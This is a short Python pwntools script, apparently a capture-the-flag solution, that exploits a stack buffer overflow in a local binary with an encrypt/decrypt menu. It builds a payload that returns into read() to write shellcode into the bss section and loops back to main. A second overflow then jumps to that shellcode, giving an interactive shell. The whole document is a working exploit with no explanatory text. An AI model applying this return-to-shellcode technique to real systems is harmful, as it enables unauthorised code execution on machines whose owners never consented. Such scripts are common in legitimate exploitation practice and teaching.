from pwn import *
r=process('./bin1.txt')
elf=ELF('bin1.txt')

readAddr=0x806e0a0
mainAddr=0x8048a6c
hackbss=0x80ebf80

padding='a'*0x48+'b'*0x4

payload1=''
payload1+=padding
payload1+=p32(readAddr)
payload1+=p32(mainAddr)
payload1+=p32(0x0)
payload1+=p32(hackbss)
payload1+=p32(0x200)

payload2=''
payload2+=padding
payload2+=p32(hackbss)

r.sendlineafter('ID:','hhh')
r.sendlineafter('(encrypt, decrypt, q)\n',payload1)
r.sendline(asm(shellcraft.sh()))
r.sendlineafter('ID:','hhh')
r.sendlineafter('(encrypt, decrypt, q)\n',payload2)

r.interactive()